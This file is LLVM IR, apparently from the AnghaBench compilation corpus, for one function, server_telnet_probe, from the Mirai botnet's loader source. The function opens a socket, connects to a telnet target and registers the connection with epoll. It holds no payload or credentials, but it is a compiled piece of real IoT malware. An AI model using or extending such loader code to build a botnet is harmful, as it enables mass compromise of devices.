; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/loader/src/extr_server.c_server_telnet_probe.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/loader/src/extr_server.c_server_telnet_probe.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.server = type { i64, i32, %struct.connection**, i32, i32, %struct.server_worker* }
%struct.connection = type { i32, %struct.server*, i32 }
%struct.server_worker = type { i32 }
%struct.telnet_info = type { i32, i32 }
%struct.sockaddr_in = type { i32, %struct.TYPE_3__, i32 }
%struct.TYPE_3__ = type { i32 }
%struct.epoll_event = type { i32, %struct.TYPE_4__ }
%struct.TYPE_4__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [32 x i8] c"Failed to open and bind socket\0A\00", align 1
@.str.1 = private unnamed_addr constant [12 x i8] c"fd too big\0A\00", align 1
@.str.2 = private unnamed_addr constant [15 x i8] c"srv == NULL 4\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@errno = common dso_local global i64 0, align 8
@EINPROGRESS = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [19 x i8] c"got connect error\0A\00", align 1
@EPOLLOUT = common dso_local global i32 0, align 4
@EPOLL_CTL_ADD = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @server_telnet_probe(%struct.server* %0, %struct.telnet_info* %1) #0 {
  %3 = alloca %struct.server*, align 8
  %4 = alloca %struct.telnet_info*, align 8
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.connection*, align 8
  %8 = alloca %struct.epoll_event, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.server_worker*, align 8
  store %struct.server* %0, %struct.server** %3, align 8
  store %struct.telnet_info* %1, %struct.telnet_info** %4, align 8
  %11 = load %struct.server*, %struct.server** %3, align 8
  %12 = call i32 @util_socket_and_bind(%struct.server* %11)
  store i32 %12, i32* %5, align 4
  %13 = load %struct.server*, %struct.server** %3, align 8
  %14 = getelementptr inbounds %struct.server, %struct.server* %13, i32 0, i32 5
  %15 = load %struct.server_worker*, %struct.server_worker** %14, align 8
  %16 = load %struct.server*, %struct.server** %3, align 8
  %17 = getelementptr inbounds %struct.server, %struct.server* %16, i32 0, i32 4
  %18 = call i64 @ATOMIC_INC(i32* %17)
  %19 = load %struct.server*, %struct.server** %3, align 8
  %20 = getelementptr inbounds %struct.server, %struct.server* %19, i32 0, i32 0
  %21 = load i64, i64* %20, align 8
  %22 = urem i64 %18, %21
  %23 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %15, i64 %22
  store %struct.server_worker* %23, %struct.server_worker** %10, align 8
  %24 = load i32, i32* %5, align 4
  %25 = icmp eq i32 %24, -1
  br i1 %25, label %26, label %36

26:                                               ; preds = %2
  %27 = call i32 @time(i32* null)
  %28 = srem i32 %27, 10
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %32

30:                                               ; preds = %26
  %31 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str, i64 0, i64 0))
  br label %32

32:                                               ; preds = %30, %26
  %33 = load %struct.server*, %struct.server** %3, align 8
  %34 = getelementptr inbounds %struct.server, %struct.server* %33, i32 0, i32 3
  %35 = call i32 @ATOMIC_DEC(i32* %34)
  br label %110

36:                                               ; preds = %2
  br label %37

37:                                               ; preds = %36
  %38 = load i32, i32* %5, align 4
  %39 = load %struct.server*, %struct.server** %3, align 8
  %40 = getelementptr inbounds %struct.server, %struct.server* %39, i32 0, i32 1
  %41 = load i32, i32* %40, align 8
  %42 = mul nsw i32 %41, 2
  %43 = icmp sge i32 %38, %42
  br i1 %43, label %44, label %51

44:                                               ; preds = %37
  %45 = call i32 @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0))
  %46 = load i32, i32* %5, align 4
  %47 = load %struct.connection*, %struct.connection** %7, align 8
  %48 = getelementptr inbounds %struct.connection, %struct.connection* %47, i32 0, i32 0
  store i32 %46, i32* %48, align 8
  %49 = load %struct.connection*, %struct.connection** %7, align 8
  %50 = call i32 @connection_close(%struct.connection* %49)
  br label %110

51:                                               ; preds = %37
  %52 = load %struct.server*, %struct.server** %3, align 8
  %53 = icmp eq %struct.server* %52, null
  br i1 %53, label %54, label %56

54:                                               ; preds = %51
  %55 = call i32 @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.2, i64 0, i64 0))
  br label %56

56:                                               ; preds = %54, %51
  %57 = load %struct.server*, %struct.server** %3, align 8
  %58 = getelementptr inbounds %struct.server, %struct.server* %57, i32 0, i32 2
  %59 = load %struct.connection**, %struct.connection*** %58, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.connection*, %struct.connection** %59, i64 %61
  %63 = load %struct.connection*, %struct.connection** %62, align 8
  store %struct.connection* %63, %struct.connection** %7, align 8
  %64 = load %struct.connection*, %struct.connection** %7, align 8
  %65 = getelementptr inbounds %struct.connection, %struct.connection* %64, i32 0, i32 2
  %66 = load %struct.telnet_info*, %struct.telnet_info** %4, align 8
  %67 = call i32 @memcpy(i32* %65, %struct.telnet_info* %66, i32 8)
  %68 = load %struct.server*, %struct.server** %3, align 8
  %69 = load %struct.connection*, %struct.connection** %7, align 8
  %70 = getelementptr inbounds %struct.connection, %struct.connection* %69, i32 0, i32 1
  store %struct.server* %68, %struct.server** %70, align 8
  %71 = load i32, i32* %5, align 4
  %72 = load %struct.connection*, %struct.connection** %7, align 8
  %73 = getelementptr inbounds %struct.connection, %struct.connection* %72, i32 0, i32 0
  store i32 %71, i32* %73, align 8
  %74 = load %struct.connection*, %struct.connection** %7, align 8
  %75 = call i32 @connection_open(%struct.connection* %74)
  %76 = load i32, i32* @AF_INET, align 4
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  store i32 %76, i32* %77, align 4
  %78 = load %struct.telnet_info*, %struct.telnet_info** %4, align 8
  %79 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %78, i32 0, i32 1
  %80 = load i32, i32* %79, align 4
  %81 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  %82 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %81, i32 0, i32 0
  store i32 %80, i32* %82, align 4
  %83 = load %struct.telnet_info*, %struct.telnet_info** %4, align 8
  %84 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %83, i32 0, i32 0
  %85 = load i32, i32* %84, align 4
  %86 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i32 %85, i32* %86, align 4
  %87 = load i32, i32* %5, align 4
  %88 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %89 = call i32 @connect(i32 %87, %struct.sockaddr* %88, i32 12)
  store i32 %89, i32* %9, align 4
  %90 = load i32, i32* %9, align 4
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %98

92:                                               ; preds = %56
  %93 = load i64, i64* @errno, align 8
  %94 = load i64, i64* @EINPROGRESS, align 8
  %95 = icmp ne i64 %93, %94
  br i1 %95, label %96, label %98

96:                                               ; preds = %92
  %97 = call i32 @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.3, i64 0, i64 0))
  br label %98

98:                                               ; preds = %96, %92, %56
  %99 = load i32, i32* %5, align 4
  %100 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %8, i32 0, i32 1
  %101 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %100, i32 0, i32 0
  store i32 %99, i32* %101, align 4
  %102 = load i32, i32* @EPOLLOUT, align 4
  %103 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %8, i32 0, i32 0
  store i32 %102, i32* %103, align 4
  %104 = load %struct.server_worker*, %struct.server_worker** %10, align 8
  %105 = getelementptr inbounds %struct.server_worker, %struct.server_worker* %104, i32 0, i32 0
  %106 = load i32, i32* %105, align 4
  %107 = load i32, i32* @EPOLL_CTL_ADD, align 4
  %108 = load i32, i32* %5, align 4
  %109 = call i32 @epoll_ctl(i32 %106, i32 %107, i32 %108, %struct.epoll_event* %8)
  br label %110

110:                                              ; preds = %98, %44, %32
  ret void
}

declare dso_local i32 @util_socket_and_bind(%struct.server*) #1

declare dso_local i64 @ATOMIC_INC(i32*) #1

declare dso_local i32 @time(i32*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @ATOMIC_DEC(i32*) #1

declare dso_local i32 @connection_close(%struct.connection*) #1

declare dso_local i32 @memcpy(i32*, %struct.telnet_info*, i32) #1

declare dso_local i32 @connection_open(%struct.connection*) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
